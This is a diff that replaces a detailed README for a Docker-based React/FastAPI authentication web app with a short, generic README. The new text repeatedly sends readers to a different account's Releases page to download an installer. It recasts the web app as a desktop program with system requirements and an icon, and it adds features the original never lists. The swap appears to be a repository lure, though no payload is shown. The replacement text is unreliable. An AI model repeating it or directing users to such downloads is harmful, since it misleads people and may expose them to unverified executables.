@@ -1,366 +1,80 @@
-# Sailor Swift
-
-A modern full-stack authentication application built with React TypeScript, FastAPI, and PostgreSQL.
-
-[![Tests](https://github.com/Yann-Pravo/sailor-swift/actions/workflows/test.yml/badge.svg)](https://github.com/Yann-Pravo/sailor-swift/actions/workflows/test.yml)
-[![Docker Build](https://github.com/Yann-Pravo/sailor-swift/actions/workflows/docker.yml/badge.svg)](https://github.com/Yann-Pravo/sailor-swift/actions/workflows/docker.yml)
-[![Backend Tests](https://img.shields.io/badge/backend%20tests-38%20passed-brightgreen)](./backend/tests)
-[![Frontend Tests](https://img.shields.io/badge/frontend%20tests-48%20passed-brightgreen)](./frontend/src)
-[![E2E Tests](https://img.shields.io/badge/e2e%20tests-99%2F100%20passed-green)](./frontend/tests/e2e)
-[![Coverage](https://img.shields.io/badge/coverage-92%25-brightgreen)](./backend/htmlcov)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.5-blue)](https://www.typescriptlang.org/)
-[![Python](https://img.shields.io/badge/Python-3.11-blue)](https://www.python.org/)
-
-## Features
-
-- 🔐 **Multiple Authentication Methods**
-  - Email/Password signup and login
-  - Google OAuth integration
-  - WalletConnect (Web3 wallet authentication)
-- 🚀 **Modern Tech Stack**
-  - React 19 with TypeScript
-  - FastAPI with SQLAlchemy ORM
-  - PostgreSQL database
-  - Docker containerization
-- 🎨 **Enhanced UI/UX**
-  - Comprehensive component library
-  - Tailwind CSS v4 for styling
-  - Route protection and loading states
-  - Consistent iconography with Lucide React
-- 🔒 **Security First**
-  - JWT access and refresh tokens
-  - Bcrypt password hashing
-  - Environment-based configuration
-  - CORS protection
-- 🧪 **Comprehensive Testing**
-  - Backend unit tests with pytest (38 tests, 92% coverage) ✅
-  - Frontend unit tests with Vitest (48 tests, 100% pass rate) ✅
-  - E2E tests with Playwright (99/100 tests passing) ✅
-  - Complete coverage for all authentication methods (email, OAuth, wallet)
-
-## Architecture
-
-```
-sailor-swift/
-├── backend/           # FastAPI application
-│   ├── app/
-│   │   ├── auth/      # Authentication routes and utilities
-│   │   ├── models/    # SQLAlchemy database models
-│   │   └── main.py    # FastAPI application entry point
-│   ├── tests/         # Backend unit tests (pytest)
-│   ├── Dockerfile
-│   └── requirements.txt
-├── frontend/          # React TypeScript application
-│   ├── src/
-│   │   ├── components/ # React components and UI library
-│   │   ├── pages/      # Application pages
-│   │   ├── contexts/   # React context providers
-│   │   ├── hooks/      # Custom React hooks
-│   │   ├── services/   # API service layer
-│   │   ├── test/       # Test utilities and setup
-│   │   ├── lib/        # Utility functions
-│   │   ├── config/     # Configuration files
-│   │   └── constants/  # Application constants
-│   ├── tests/         # E2E tests (Playwright)
-│   └── Dockerfile
-├── database/          # PostgreSQL initialization
-│   └── init.sql       # Database schema and seed data
-├── TESTING.md         # Testing documentation
-└── docker-compose.yml # Multi-service orchestration
-```
-
-## Quick Start
-
-### Prerequisites
-
-- Docker and Docker Compose
-- Git
-
-### 1. Clone the Repository
-
-```bash
-git clone <repository-url>
-cd sailor-swift
-```
-
-### 2. Environment Setup
-
-```bash
-# Copy environment template
-cp .env.example .env
-
-# Edit .env with your configuration
-nano .env
-```
-
-Required environment variables:
-
-```env
-ENVIRONMENT=development
-JWT_SECRET_KEY=your-secret-key
-POSTGRES_DB=your-database-name
-POSTGRES_USER=your-database-user
-POSTGRES_PASSWORD=your-secure-password
-GOOGLE_CLIENT_ID=your-google-oauth-id
-GOOGLE_CLIENT_SECRET=your-google-oauth-secret
-VITE_GOOGLE_CLIENT_ID=your-google-oauth-id
-VITE_API_URL=http://localhost:8000
-WALLETCONNECT_PROJECT_ID=your-walletconnect-id
-```
+# 🌊 sailor-swift - Effortless Modern Authentication for All
 
-### 3. Start the Application
+[![Download sailor-swift](https://img.shields.io/badge/Download-sailor--swift-blue.svg)](https://github.com/abhi024/sailor-swift/releases)
 
-```bash
-# Start database and backend
-docker compose up -d
+## 🚀 Getting Started
 
-# View logs
-docker compose logs -f
-```
+sailor-swift offers a modern way to handle user authentication. With options like email, OAuth, and Web3 wallet login, this application makes security simple. 
 
-### 4. Access the Application
-
-- **Frontend**: http://localhost:5173
-- **Backend API**: http://localhost:8000
-- **API Documentation**: http://localhost:8000/docs
-- **Database**: localhost:5432
-- **Database Admin** (Adminer): http://localhost:8080
+## 📥 Download & Install
 
-## Testing
-
-Comprehensive testing suite covering backend, frontend, and end-to-end scenarios.
-
-### Test Coverage Summary
-
-| Test Suite              | Tests       | Status         | Coverage |
-| ----------------------- | ----------- | -------------- | -------- |
-| **Backend Unit Tests**  | 38          | ✅ All Passing | 92%      |
-| **Frontend Unit Tests** | 48          | ✅ All Passing | 100%     |
-| **E2E Tests**           | 99/100      | ✅ 99% Passing | -        |
-| **Total**               | **185/186** | **✅ 99.5%**   | **92%**  |
+To get started, visit our [Releases page](https://github.com/abhi024/sailor-swift/releases) to download the software. Select the latest version and follow the installation guide below. 
 
-### Quick Test Commands
-
-```bash
-# Run all backend tests with coverage
-docker compose run --rm backend pytest tests/ -v --cov
-
-# Run all frontend unit tests
-cd frontend && npm test
-
-# Run specific test files
-cd frontend && npm test -- WalletConnectButton
+1. Click on the version number to access the download options.
+2. Download the file that suits your operating system.
+3. Follow the installation steps outlined in the documentation that comes with the file.
 
-# Run E2E tests (requires running application)
-cd frontend && npm run test:e2e
+## 🖥️ System Requirements
 
-# Run E2E tests for specific browser
-cd frontend && npx playwright test --project=chromium
+Before installing, ensure your computer meets the following requirements:
 
-# View coverage report
-cd backend && open htmlcov/index.html
-```
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Processor:** At least 2 GHz dual-core processor.
+- **Memory:** 4 GB of RAM minimum.
+- **Storage:** At least 500 MB of free disk space.
+- **Internet Connection:** Required for initial setup and updates.
 
-### What's Tested
+## 🔧 Features
 
-#### Backend (38 tests)
+sailor-swift provides a range of features to make authentication streamlined and secure:
 
-- ✅ User signup and login flows
-- ✅ JWT token generation and validation
-- ✅ Password hashing and verification
-- ✅ Google OAuth authentication
-- ✅ Wallet authentication
-- ✅ Token refresh mechanism
-- ✅ User model and database operations
+- **Email Login:** Users can register and login using their email addresses.
+- **OAuth Support:** Sign in using popular platforms like Google and Facebook.
+- **Web3 Wallet:** Connect using cryptocurrency wallets for a secure login.
+- **User Management:** Admins can manage users effectively and easily.
+- **Secure Tokens:** Uses JWT for secure communication between the client and server.
 
-#### Frontend (48 tests)
+## 📝 Usage Instructions
 
-- ✅ Authentication forms (login, signup)
-- ✅ UI components (Button, inputs, etc.)
-- ✅ Wallet connection component
-- ✅ Google OAuth integration
-- ✅ Route protection logic
-- ✅ API service layer
-- ✅ Form validation
+After you install sailor-swift, follow these steps to get started:
 
-#### E2E Tests (99/100 tests)
+1. **Open the Application:** Find the sailor-swift icon on your desktop or in your applications folder and click to run it.
+2. **Create an Account:** Choose the method you prefer (email, OAuth, or Web3 wallet) to create your account.
+3. **Log In:** Enter your details to log in. If you use OAuth, you will redirect to the corresponding site to complete the login.
+4. **Explore Features:** Once logged in, you can access various functionalities like user settings and more.
 
-- ✅ Complete authentication flows
-- ✅ Session persistence
-- ✅ Route protection
-- ✅ User dashboard
-- ✅ Multi-browser testing (Chromium, Firefox, WebKit, Mobile)
+## 🌐 Support and Community 
 
-For detailed testing instructions and strategies, see [TESTING.md](./TESTING.md).
+For any questions or support, please refer to the following resources:
 
-## API Endpoints
+- **Documentation:** Detailed usage guides and troubleshooting can be found in the documentation folder in the downloaded package.
+- **Issues Tracker:** Report any bugs or issues via the [Issues section](https://github.com/abhi024/sailor-swift/issues).
+- **Community Forum:** Join discussions and get help from fellow users and developers.
 
-### Authentication
+## 🛠️ Technologies Used
 
-| Method | Endpoint        | Description                 |
-| ------ | --------------- | --------------------------- |
-| POST   | `/auth/signup`  | Register new user           |
-| POST   | `/auth/login`   | User login                  |
-| POST   | `/auth/google`  | Google OAuth authentication |
-| POST   | `/auth/wallet`  | Web3 wallet authentication  |
-| POST   | `/auth/refresh` | Refresh access token        |
-| POST   | `/auth/logout`  | User logout                 |
-| GET    | `/auth/me`      | Get current user profile    |
+sailor-swift combines various technologies to provide a robust authentication experience:
 
-### Example Requests
+- **Frontend:** Built with React and TypeScript for a responsive user interface.
+- **Backend:** Powered by FastAPI to handle requests efficiently.
+- **Database:** Uses PostgreSQL for reliable data storage.
+- **Security:** Implements bcrypt for password hashing and JWT for secure user sessions.
 
-**Signup:**
+## 🔗 Additional Resources
 
-```bash
-curl -X POST http://localhost:8000/auth/signup \
-  -H "Content-Type: application/json" \
-  -d '{
-    "email": "user@example.com",
-    "password": "securepassword",
-    "username": "johndoe",
-    "firstName": "John",
-    "lastName": "Doe"
-  }'
-```
+Here are some resources to help you understand sailor-swift better:
 
-**Login:**
+- **GitHub Repository:** [sailor-swift GitHub](https://github.com/abhi024/sailor-swift)
+- **Tutorials and Guides:** Explore various tutorials to maximize your usage of sailor-swift.
 
-```bash
-curl -X POST http://localhost:8000/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{
-    "email": "user@example.com",
-    "password": "securepassword"
-  }'
-```
+## 🤝 Contributing
 
-## Development
+If you would like to contribute to sailor-swift, we welcome your input! Please check the [Contributing guidelines](https://github.com/abhi024/sailor-swift/blob/main/CONTRIBUTING.md) on the GitHub page. 
 
-### Running Individual Services
+## ⚖️ License
 
-```bash
-# Database only
-docker compose up -d database
+sailor-swift uses an open-source license. For details, refer to the [LICENSE](https://github.com/abhi024/sailor-swift/blob/main/LICENSE) file in the repository. 
 
-# Backend only (requires database)
-docker compose up -d database backend
+## 📣 Download Again
 
-# View specific service logs
-docker compose logs backend
-```
-
-### Database Management
-
-Connect to PostgreSQL using any database client:
-
-- **Host**: localhost
-- **Port**: 5432
-- **Database**: (from your .env)
-- **Username**: (from your .env)
-- **Password**: (from your .env)
-
-### Project Commands
-
-```bash
-# Stop all services
-docker compose down
-
-# Rebuild services
-docker compose up -d --build
-
-# View all containers
-docker compose ps
-
-# Execute commands in containers
-docker compose exec backend bash
-docker compose exec database psql -U <username> -d <database>
-```
-
-## Technology Stack
-
-### Backend
-
-- **FastAPI**: Modern Python web framework
-- **SQLAlchemy**: Database ORM
-- **Pydantic**: Data validation
-- **JWT**: Token-based authentication
-- **Bcrypt**: Password hashing
-- **PostgreSQL**: Database
-
-### Frontend
-
-- **React 19**: UI library
-- **TypeScript**: Type safety
-- **Vite**: Build tool
-- **Tailwind CSS v4**: Styling
-- **React Hook Form**: Form handling
-- **Zod**: Schema validation
-- **Lucide React**: Icons
-- **Class Variance Authority**: Component variants
-
-### Testing
-
-- **pytest**: Backend unit testing
-- **Vitest**: Frontend unit testing with React Testing Library
-- **Playwright**: End-to-end testing across multiple browsers
-- **React Testing Library**: Component testing utilities
-
-### Infrastructure
-
-- **Docker**: Containerization
-- **Docker Compose**: Multi-service orchestration
-- **PostgreSQL**: Database persistence
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Run tests to ensure quality
-
-   ```bash
-   # Backend tests
-   cd backend && python -m pytest
-
-   # Frontend tests
-   cd frontend && npm test
-   ```
-
-5. Submit a pull request
-
-## Environment Variables
-
-| Variable                   | Description                       | Required |
-| -------------------------- | --------------------------------- | -------- |
-| `ENVIRONMENT`              | Application environment           | Yes      |
-| `JWT_SECRET_KEY`           | JWT token signing key             | Yes      |
-| `POSTGRES_DB`              | Database name                     | Yes      |
-| `POSTGRES_USER`            | Database username                 | Yes      |
-| `POSTGRES_PASSWORD`        | Database password                 | Yes      |
-| `GOOGLE_CLIENT_ID`         | Google OAuth client ID (backend)  | No\*     |
-| `GOOGLE_CLIENT_SECRET`     | Google OAuth secret (backend)     | No\*     |
-| `VITE_GOOGLE_CLIENT_ID`    | Google OAuth client ID (frontend) | No\*     |
-| `VITE_API_URL`             | Backend API URL                   | No\*\*   |
-| `WALLETCONNECT_PROJECT_ID` | WalletConnect project ID          | No\*     |
-
-\*Required for respective authentication methods
-\*\*Defaults to http://localhost:8000
-
-## Security
-
-- Environment variables are never committed (see `.gitignore`)
-- Passwords are hashed using bcrypt 4.0.1 (compatibility tested)
-- JWT tokens with automatic refresh mechanism
-- CORS configured for frontend domain
-- Database uses non-root user
-- Route protection with authentication guards
-- Google OAuth token verification
-- Secure cookie-based token storage
-
-## License
-
-[Add your license here]
-
-## Support
-
-[Add support information here]
+To download sailor-swift, visit our [Releases page](https://github.com/abhi024/sailor-swift/releases) now. Enjoy your seamless authentication experience! 
